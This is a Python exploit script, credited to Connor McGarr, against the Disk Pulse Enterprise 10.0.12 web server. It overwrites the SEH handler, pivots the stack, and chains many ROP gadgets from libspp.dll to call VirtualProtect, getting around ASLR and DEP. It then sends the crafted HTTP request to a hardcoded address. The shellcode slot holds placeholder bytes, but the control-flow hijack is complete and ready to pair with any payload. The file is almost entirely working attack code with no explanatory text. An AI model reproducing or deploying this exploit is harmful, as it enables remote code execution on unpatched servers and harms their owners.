# Disk Pulse Enterprise 10.0.12 (SEH, ASLR, and DEP Bypass)
# kernel32!VirtualProtect
# Author: Connor McGarr (@330yre)
# In muts we trust.
import sys
import os
import socket
import struct
import time

# Place shellcode here
shellcode = "\xCC" * 400

# Offset to SEH
crash = "\x41" * 2499

# SEH overwrite - stack pivot back into long buffer
crash += struct.pack('<L', 0x1005d86b)			# add esp, 0x1004 ; ret: libspp.dll (non-ASLR enabled module)

# Padding to stack pivot
crash += "\x43" * 192

# Stack pivot lands here abnd ROP chain begins here
print "[+] Beginning ROP chain..."

# Preserve a stack address into EAX and ECX. To get EAX into ECX, need to load a pointer to a ROP gadget into EDX for COP gadget mov ecx, eax ; call dword ptr [edx]
crash += struct.pack('<L', 0x1014368e)			# xchg eax, ebp ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1012be4f)			# pop esi ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10116052)			# add esp, 0x4 ; ret: libspp.dll (non-ASLR enabled module) (Return to stack gadget to be arbitrarily written to a pointer in the .data seciton of libspp.dll)
crash += struct.pack('<L', 0x10159ef7)			# pop ebx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x101dc038)			# Random address from the .data section of libspp.dll (writable)
crash += struct.pack('<L', 0x1013a06c)			# xor edx, edx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1015675e)			# add edx, ebx ; pop ebx ; retn 0x10: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget
crash += struct.pack('<L', 0x1013f526)			# mov dword [edx], esi ; pop esi ; pop ebp ; pop ebx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget (ret 0x10)
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget (ret 0x10)
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget (ret 0x10)
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget (ret 0x10)
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget
crash += struct.pack('<L', 0x10033cd4)			# mov ecx, eax ; call dword ptr [edx]: libspp.dll (non-ASLR enabled module)

# EAX and ECX are currently 0x102c bytes away from ESP
# ESP, after all necessary ROP gadgets, will be 0x1048 bytes away from EAX
# Making EAX and ECX equal to the location of the stack
# Utilizing the previous COP gadget's return to the stack
crash += struct.pack('<L', 0x10153e8a)			# pop ebp ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0xffffefb8)			# Negative representation of 0x1048
crash += struct.pack('<L', 0x1014b588)			# sub eax, ebp ; pop esi ; pop ebp ; pop ebx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget
crash += struct.pack('<L', 0x1008add9)			# mov ecx, eax ; call dword ptr [edx]: libspp.dll (non-ASLR enabled module)

# Jump over kernel32!VirtualProtect parameter placeholders
crash += struct.pack('<L', 0x10137191)			# add esp, 0x18 ; ret: libspp.dll (non-ASLR enabled module)

# kernel32!VirtualProtect parameter placeholders
crash += struct.pack('<L', 0x10167074)			# Pointer from IAT to kernel32!GetDriveTypeA (negative 0xffff6185 bytes ahead of kernel32!VirtualProtect)
crash += struct.pack('<L', 0x11111111)			# Return parameter placeholder (shellcode)
crash += struct.pack('<L', 0x22222222)			# lpAddress (shellcode)
crash += struct.pack('<L', 0x33333333)			# dwSize
crash += struct.pack('<L', 0x44444444)			# flNewProtect (RWX = 0x40)
crash += struct.pack('<L', 0x55555555)			# lpflOldProtect

# Return
crash += struct.pack('<L', 0x10153e8a)			# pop ebp ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0xfffffe10)			# Negative distance from EAX to shellcode
crash += struct.pack('<L', 0x1014b588)			# sub eax, ebp ; pop esi ; pop ebp ; pop ebx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget
crash += struct.pack('<L', 0x100e1531)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1531)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1531)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1531)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10113db1)			# mov dword ptr [ecx], eax ; retn 0xC: libspp.dll (non-ASLR enabled module)

# lpAddress
crash += struct.pack('<L', 0x100e1531)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget (ret 0xC)
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget (ret 0xC)
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget (ret 0xC)
crash += struct.pack('<L', 0x100e1531)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1531)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1531)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10113db1)			# mov dword ptr [ecx], eax ; retn 0xC: libspp.dll (non-ASLR enabled module)

# dwSize
crash += struct.pack('<L', 0x10128c12)			# xor eax, eax ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget (ret 0xC)
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget (ret 0xC)
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget (ret 0xC)
crash += struct.pack('<L', 0x10153e8a)			# pop ebp ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0xfffffdff)			# Negative 0x201
crash += struct.pack('<L', 0x1014b588)			# sub eax, ebp ; pop esi ; pop ebp ; pop ebx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget
crash += struct.pack('<L', 0x100e1531)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1531)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1531)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1531)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10113db1)			# mov dword ptr [ecx], eax ; retn 0xC: libspp.dll (non-ASLR enabled module)

# flNewProtect
crash += struct.pack('<L', 0x10128c12)			# xor eax, eax ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget (ret 0xC)
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget (ret 0xC)
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget (ret 0xC)
crash += struct.pack('<L', 0x10153e8a)			# pop ebp ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0xffffffc0)			# Negative 0x40 (PAGE_EXECUTE_READWRITE)
crash += struct.pack('<L', 0x1014b588)			# sub eax, ebp ; pop esi ; pop ebp ; pop ebx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget
crash += struct.pack('<L', 0x100e1531)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1531)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1531)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1531)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10113db1)			# mov dword ptr [ecx], eax ; retn 0xC: libspp.dll (non-ASLR enabled module)

# lpflOldProtect
crash += struct.pack('<L', 0x1012a823)			# pop eax ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget (ret 0xC)
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget (ret 0xC)
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget (ret 0xC)
crash += struct.pack('<L', 0x101dc038)			# Random address from the .data section of libspp.dll (writable)
crash += struct.pack('<L', 0x100e1531)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1531)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1531)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1531)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10113db1)			# mov dword ptr [ecx], eax ; retn 0xC: libspp.dll (non-ASLR enabled module)

# kernel32!VirtualProtect
crash += struct.pack('<L', 0x100fc113)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget (ret 0xC)
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget (ret 0xC)
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget (ret 0xC)
crash += struct.pack('<L', 0x100fc113)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fc113)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fc113)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fc113)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fc113)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fc113)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fc113)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fc113)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fc113)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fc113)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fc113)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fc113)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fc113)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fc113)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fc113)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fc113)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fc113)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fc113)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fc113)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fc113)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fc113)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fc113)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100fc113)			# dec ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10135f9b)			# mov eax, dword ptr [ecx+0x4] ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1014d06c)			# mov eax, dword ptr [eax] ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10153e8a)			# pop ebp ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0xffff6185)			# Negative distance to kernel32!VirtualProtect
crash += struct.pack('<L', 0x1014b588)			# sub eax, ebp ; pop esi ; pop ebp ; pop ebx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget
crash += struct.pack('<L', 0x100e1531)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1531)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1531)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x100e1531)			# inc ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10113db1)			# mov dword ptr [ecx], eax ; retn 0xC: libspp.dll (non-ASLR enabled module)

# Kick off the function call
crash += struct.pack('<L', 0x1014bdc1)			# mov eax, ecx ; ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget (ret 0xC)
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget (ret 0xC)
crash += struct.pack('<L', 0x90909090)			# Padding to compensate for the previous ROP gadget (ret 0xC)
crash += struct.pack('<L', 0x101388b9)			# xchg eax, esp ; ret: libspp.dll (non-ASLR enabled module)

# NOPs
crash += "\x90" * (100)

# Shellcode placeholder
crash += shellcode

# Crash the application to corrupt memory
crash += "\x90" * (5000-len(crash))

## Vulnerability resides in the Host header
http_request = "GET /" + crash + "HTTP/1.1" + "\r\n"
http_request += "Host: 72.16.197.2" + "\r\n"
http_request += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0" + "\r\n"
http_request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + "\r\n"
http_request += "Accept-Language: en-US,en;q=0.5" + "\r\n"
http_request += "Accept-Encoding: gzip, deflate" + "\r\n"
http_request += "Connection: keep-alive" + "\r\n\r\n"

print "[+] Sending exploit..."
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.197.2", 80))
s.send(http_request)
s.close()
